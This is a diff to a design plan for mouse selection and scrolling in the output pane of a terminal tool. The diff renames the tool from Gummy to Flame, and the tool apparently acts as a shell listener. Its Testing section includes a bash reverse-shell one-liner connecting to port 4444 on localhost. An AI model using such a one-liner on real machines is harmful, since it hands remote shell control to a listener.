@@ -1,10 +1,10 @@
 # Mouse Selection Engine Plan
 
 ## Overview
-Implement mouse-based text selection + scroll in Gummy's output pane, inspired by Crush but simplified for our single-pane architecture.
+Implement mouse-based text selection + scroll in Flame's output pane, inspired by Crush but simplified for our single-pane architecture.
 
 ## Why We Don't Need Ultraviolet
-Crush has a 5-layer system because it handles a **list of messages** (each with borders, padding, expansion, individual highlighting). Gummy has a **single scrollable output pane** — all content is one continuous text buffer. This means we can implement selection with simple line/column math + ANSI manipulation.
+Crush has a 5-layer system because it handles a **list of messages** (each with borders, padding, expansion, individual highlighting). Flame has a **single scrollable output pane** — all content is one continuous text buffer. This means we can implement selection with simple line/column math + ANSI manipulation.
 
 ## Architecture
 
@@ -148,7 +148,7 @@ cmd.Run()
 ## Testing
 ```bash
 # Build and run
-go build -o gummy . && ./gummy -ip 127.0.0.1 -p 4444
+go build -o flame . && ./flame -ip 127.0.0.1 -p 4444
 
 # In another terminal, connect a shell
 bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
